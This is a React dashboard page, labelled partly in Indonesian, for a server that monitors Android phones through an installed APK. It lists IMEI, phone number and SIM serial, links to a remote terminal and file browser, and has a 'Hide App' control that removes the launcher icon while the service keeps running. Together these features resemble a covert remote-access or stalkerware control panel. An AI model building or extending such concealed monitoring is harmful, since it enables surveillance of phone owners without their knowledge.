'use client'
import { useEffect, useState, useCallback } from 'react'
import Sidebar from '@/components/Sidebar'
import StatCard from '@/components/StatCard'
import {
  Battery, BatteryCharging, Cpu, HardDrive, Wifi,
  Clock, RefreshCw, Smartphone, EyeOff, Eye, Bell, BellOff,
  CreditCard, Signal
} from 'lucide-react'
import { Server } from 'lucide-react'

interface DeviceListItem {
  deviceId: string
  deviceName: string
  connected: boolean
  lastSeen: string | null
  model: string
  androidVersion: string
  battery: string
  batteryStatus: string
  ip: string
}

interface DeviceStats {
  connected: boolean
  lastSeen: string | null
  battery: string
  batteryStatus: string
  model: string
  androidVersion: string
  ip: string
  storage: string
  storageFree: string
  networkType: string
  cpuUsage: string
  memTotal: string
  memFree: string
  uptime: string
  hostname: string
  kernel: string
  screenState: string
  brand?: string
  device?: string
  imei?: string
  phoneNumber?: string
  simOperator?: string
  simCountry?: string
  simSerial?: string
  simSlots?: string
  simState?: string
  networkOperator?: string
  networkGeneration?: string
  roaming?: string
  mccMnc?: string
}

interface DeviceEntry {
  deviceId: string
  deviceName: string
  connected: boolean
  lastSeen: string | null
  stats: DeviceStats
}

export default function Dashboard() {
  const [devices, setDevices] = useState<DeviceListItem[]>([])
  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [device, setDevice] = useState<DeviceEntry | null>(null)
  const [loading, setLoading] = useState(true)
  const [isHidden, setIsHidden] = useState(false)
  const [isRinging, setIsRinging] = useState(false)
  const [ctrlBusy, setCtrlBusy] = useState(false)

  const fetchDevices = useCallback(async () => {
    try {
      const res = await fetch('/api/devices')
      const data = await res.json()
      const list: DeviceListItem[] = data.devices ?? []
      setDevices(list)
      if (!selectedId && list.length > 0) {
        const online = list.find(d => d.connected) ?? list[0]
        setSelectedId(online.deviceId)
      }
    } catch {}
    setLoading(false)
  }, [selectedId])

  const fetchDevice = useCallback(async () => {
    if (!selectedId) return
    try {
      const res = await fetch('/api/device/heartbeat')
      const data = await res.json()
      const found = (data.devices ?? []).find((d: DeviceEntry) => d.deviceId === selectedId)
      if (found) setDevice(found)
    } catch {}
  }, [selectedId])

  useEffect(() => {
    fetchDevices()
    const interval = setInterval(fetchDevices, 3000)
    return () => clearInterval(interval)
  }, [fetchDevices])

  useEffect(() => {
    if (selectedId) fetchDevice()
  }, [selectedId, fetchDevice])

  const sendControl = async (command: string) => {
    if (!selectedId || ctrlBusy) return
    setCtrlBusy(true)
    try {
      await fetch('/api/device/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command }),
      })
    } finally {
      setCtrlBusy(false)
    }
  }

  const handleHideToggle = async () => {
    const cmd = isHidden ? 'unhide_app' : 'hide_app'
    await sendControl(cmd)
    setIsHidden(h => !h)
  }

  const handleRingToggle = async () => {
    const cmd = isRinging ? 'stop_ring' : 'ring_device'
    await sendControl(cmd)
    setIsRinging(r => !r)
  }

  const connected = device ? device.connected : false
  const stats = device?.stats
  const battPct = parseInt(stats?.battery ?? '0') || 0
  const battColor = battPct > 50 ? 'green' : battPct > 20 ? 'yellow' : 'red'
  const isCharging = stats?.batteryStatus === 'Charging'
  const memFreeNum = parseFloat(stats?.memFree ?? '0') || 0
  const memTotalNum = parseFloat(stats?.memTotal ?? '1') || 1
  const memUsedPct = Math.round((1 - memFreeNum / memTotalNum) * 100)
  const storageUsed = parseFloat(stats?.storage ?? '0') || 0
  const storageFree = parseFloat(stats?.storageFree ?? '0') || 0
  const storageTotal = storageUsed + storageFree
  const storageUsedPct = storageTotal ? Math.round((storageUsed / storageTotal) * 100) : 0

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />

      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-5xl mx-auto px-4 md:px-6 py-4 md:py-6">

          {/* Header */}
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-lg md:text-xl font-bold text-white">Device Dashboard</h2>
              <p className="text-android-muted text-xs md:text-sm mt-0.5">
                {connected
                  ? `Connected · ${device?.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : '--'}`
                  : devices.length > 0 ? 'Select a device below' : 'Waiting for device…'}
              </p>
            </div>
            <button
              onClick={fetchDevices}
              className="flex items-center gap-1.5 px-3 py-2 bg-android-surface border border-android-border rounded-lg text-xs text-android-muted hover:text-android-text transition-colors"
            >
              <RefreshCw size={13} />
              <span className="hidden sm:inline">Refresh</span>
            </button>
          </div>

          {/* Device Selector */}
          {devices.length > 1 && (
            <div className="mb-4 flex gap-2 overflow-x-auto pb-1">
              {devices.map(d => (
                <button
                  key={d.deviceId}
                  onClick={() => setSelectedId(d.deviceId)}
                  className={`shrink-0 flex items-center gap-2 px-3 py-2 rounded-xl border text-xs font-medium transition-colors ${
                    selectedId === d.deviceId
                      ? 'bg-android-green/10 border-android-green/50 text-android-green'
                      : 'bg-android-surface border-android-border text-android-muted hover:text-android-text'
                  }`}
                >
                  <div className={`w-2 h-2 rounded-full ${d.connected ? 'bg-android-green' : 'bg-android-red'}`} />
                  <span>{d.deviceName}</span>
                </button>
              ))}
            </div>
          )}

          {/* No device banner */}
          {!connected && !loading && devices.length === 0 && (
            <div className="mb-4 p-4 bg-android-yellow/10 border border-android-yellow/30 rounded-xl flex items-start gap-3">
              <Smartphone size={16} className="text-android-yellow mt-0.5 shrink-0" />
              <div>
                <p className="text-android-yellow text-sm font-medium">No device connected</p>
                <p className="text-android-muted text-xs mt-0.5">
                  Install the APK on your Android device. It will auto-connect to this dashboard.
                </p>
              </div>
            </div>
          )}

          {/* Stat cards */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-2.5 md:gap-3 mb-4">
            <StatCard
              label="Battery"
              value={connected ? `${stats?.battery ?? '--'}%` : '--'}
              sub={isCharging ? 'Charging' : connected ? 'Discharging' : 'No device'}
              icon={isCharging ? <BatteryCharging size={17} /> : <Battery size={17} />}
              color={connected ? battColor : 'default'}
              bar={connected ? battPct : undefined}
            />
            <StatCard
              label="CPU Usage"
              value={connected ? (stats?.cpuUsage ?? '--') : '--'}
              sub="Processor load"
              icon={<Cpu size={17} />}
              color="blue"
              bar={connected ? parseInt(stats?.cpuUsage ?? '0') : undefined}
            />
            <StatCard
              label="RAM Free"
              value={connected ? (stats?.memFree ?? '--') : '--'}
              sub={connected ? `of ${stats?.memTotal ?? '--'}` : 'No device'}
              icon={<Server size={17} />}
              color="yellow"
              bar={connected ? memUsedPct : undefined}
            />
            <StatCard
              label="Storage"
              value={connected ? (stats?.storageFree ?? '--') : '--'}
              sub={connected ? `free of ${storageTotal ? storageTotal.toFixed(1) + ' GB' : '--'}` : 'No device'}
              icon={<HardDrive size={17} />}
              color="green"
              bar={connected ? storageUsedPct : undefined}
            />
          </div>

          {/* Info cards */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-3">
            <div className="bg-android-surface border border-android-border rounded-xl p-4">
              <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
                <Smartphone size={13} /> Device Info
              </h3>
              <div className="space-y-2.5">
                {[
                  { label: 'Model', value: stats?.model },
                  { label: 'Android', value: stats?.androidVersion },
                  { label: 'Hostname', value: stats?.hostname },
                  { label: 'Kernel', value: stats?.kernel },
                  { label: 'Screen', value: stats?.screenState },
                ].map(({ label, value }) => (
                  <div key={label} className="flex justify-between items-center py-0.5 border-b border-android-border/50 last:border-0">
                    <span className="text-android-muted text-xs">{label}</span>
                    <span className="text-android-text text-xs font-medium font-mono truncate max-w-[160px] md:max-w-[200px]">
                      {connected ? (value || '--') : '--'}
                    </span>
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-android-surface border border-android-border rounded-xl p-4">
              <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
                <Wifi size={13} /> Network & System
              </h3>
              <div className="space-y-2.5">
                {[
                  { label: 'IP Address', value: stats?.ip },
                  { label: 'Network', value: stats?.networkType },
                  { label: 'Uptime', value: stats?.uptime },
                  { label: 'Storage Used', value: connected ? `${storageUsedPct}%` : '--' },
                  { label: 'RAM Used', value: connected ? `${memUsedPct}%` : '--' },
                ].map(({ label, value }) => (
                  <div key={label} className="flex justify-between items-center py-0.5 border-b border-android-border/50 last:border-0">
                    <span className="text-android-muted text-xs">{label}</span>
                    <span className="text-android-text text-xs font-medium font-mono truncate max-w-[160px] md:max-w-[200px]">
                      {connected ? (value || '--') : '--'}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* SIM & Identitas Perangkat */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-3">
            <div className="bg-android-surface border border-android-border rounded-xl p-4">
              <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
                <CreditCard size={13} /> SIM Card & Telepon
              </h3>
              <div className="space-y-2.5">
                {[
                  { label: 'IMEI', value: stats?.imei },
                  { label: 'Nomor HP', value: stats?.phoneNumber },
                  { label: 'Operator SIM', value: stats?.simOperator },
                  { label: 'Negara SIM', value: stats?.simCountry },
                  { label: 'Status SIM', value: stats?.simState },
                  { label: 'Slot SIM', value: stats?.simSlots ? `${stats.simSlots} slot` : '--' },
                  { label: 'Serial SIM', value: stats?.simSerial },
                ].map(({ label, value }) => (
                  <div key={label} className="flex justify-between items-center py-0.5 border-b border-android-border/50 last:border-0">
                    <span className="text-android-muted text-xs">{label}</span>
                    <span className={`text-xs font-medium font-mono truncate max-w-[180px] ${label === 'IMEI' ? 'text-android-yellow' : 'text-android-text'}`}>
                      {connected ? (value || '--') : '--'}
                    </span>
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-android-surface border border-android-border rounded-xl p-4">
              <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
                <Signal size={13} /> Info Jaringan Lengkap
              </h3>
              <div className="space-y-2.5">
                {[
                  { label: 'Koneksi', value: stats?.networkType },
                  { label: 'Generasi', value: stats?.networkGeneration },
                  { label: 'Operator Jaringan', value: stats?.networkOperator },
                  { label: 'MCC-MNC', value: stats?.mccMnc },
                  { label: 'Roaming', value: stats?.roaming },
                  { label: 'IP Address', value: stats?.ip },
                  { label: 'Uptime', value: stats?.uptime },
                ].map(({ label, value }) => (
                  <div key={label} className="flex justify-between items-center py-0.5 border-b border-android-border/50 last:border-0">
                    <span className="text-android-muted text-xs">{label}</span>
                    <span className={`text-xs font-medium font-mono truncate max-w-[180px] ${
                      label === 'Generasi' ? 'text-android-green' :
                      label === 'Roaming' && value === 'Ya' ? 'text-android-red' : 'text-android-text'
                    }`}>
                      {connected ? (value || '--') : '--'}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Device Control — Hide App & Ring */}
          <div className="bg-android-surface border border-android-border rounded-xl p-4 mb-3">
            <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
              <EyeOff size={13} /> Device Control
            </h3>
            {!connected ? (
              <p className="text-android-muted text-xs py-2 text-center">Device must be connected to use these controls</p>
            ) : (
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">

                {/* Hide App */}
                <div className="bg-android-bg border border-android-border rounded-xl p-4 flex flex-col gap-3">
                  <div className="flex items-start gap-3">
                    <div className={`p-2 rounded-lg ${isHidden ? 'bg-android-red/10' : 'bg-android-green/10'}`}>
                      {isHidden ? <EyeOff size={18} className="text-android-red" /> : <Eye size={18} className="text-android-green" />}
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-android-text">
                        {isHidden ? 'App Hidden' : 'App Visible'}
                      </p>
                      <p className="text-xs text-android-muted mt-0.5">
                        {isHidden
                          ? 'Icon removed from launcher. Service still running.'
                          : 'App icon visible in launcher.'}
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={handleHideToggle}
                    disabled={ctrlBusy}
                    className={`w-full py-2 rounded-lg text-sm font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed ${
                      isHidden
                        ? 'bg-android-green/10 border border-android-green/30 text-android-green hover:bg-android-green/20'
                        : 'bg-android-red/10 border border-android-red/30 text-android-red hover:bg-android-red/20'
                    }`}
                  >
                    {ctrlBusy ? '…' : isHidden ? '👁 Unhide App' : '🙈 Hide App'}
                  </button>
                </div>

                {/* Ring */}
                <div className="bg-android-bg border border-android-border rounded-xl p-4 flex flex-col gap-3">
                  <div className="flex items-start gap-3">
                    <div className={`p-2 rounded-lg ${isRinging ? 'bg-android-yellow/10' : 'bg-android-surface'}`}>
                      {isRinging ? <Bell size={18} className="text-android-yellow" /> : <BellOff size={18} className="text-android-muted" />}
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-android-text">
                        {isRinging ? 'Ringing Now' : 'Ring Device'}
                      </p>
                      <p className="text-xs text-android-muted mt-0.5">
                        {isRinging
                          ? 'Device is ringing at max volume.'
                          : 'Trigger ring at max volume to locate device.'}
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={handleRingToggle}
                    disabled={ctrlBusy}
                    className={`w-full py-2 rounded-lg text-sm font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed ${
                      isRinging
                        ? 'bg-android-red/10 border border-android-red/30 text-android-red hover:bg-android-red/20'
                        : 'bg-android-yellow/10 border border-android-yellow/30 text-android-yellow hover:bg-android-yellow/20'
                    }`}
                  >
                    {ctrlBusy ? '…' : isRinging ? '🔇 Stop Ring' : '🔔 Ring Device'}
                  </button>
                </div>

              </div>
            )}
          </div>

          {/* Quick actions */}
          <div className="bg-android-surface border border-android-border rounded-xl p-4">
            <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
              <Clock size={13} /> Quick Actions
            </h3>
            <div className="grid grid-cols-3 gap-2">
              {[
                { label: '📟 Terminal', href: `/terminal${selectedId ? `?d=${selectedId}` : ''}` },
                { label: '📂 Files', href: `/files${selectedId ? `?d=${selectedId}` : ''}` },
                { label: '⚙️ Setup', href: '/setup' },
              ].map(({ label, href }) => (
                <a
                  key={label}
                  href={href}
                  className="flex items-center justify-center px-3 py-2.5 bg-android-bg border border-android-border rounded-lg text-xs text-android-text hover:border-android-green hover:text-android-green transition-colors text-center"
                >
                  {label}
                </a>
              ))}
            </div>
          </div>

        </div>
      </main>
    </div>
  )
}
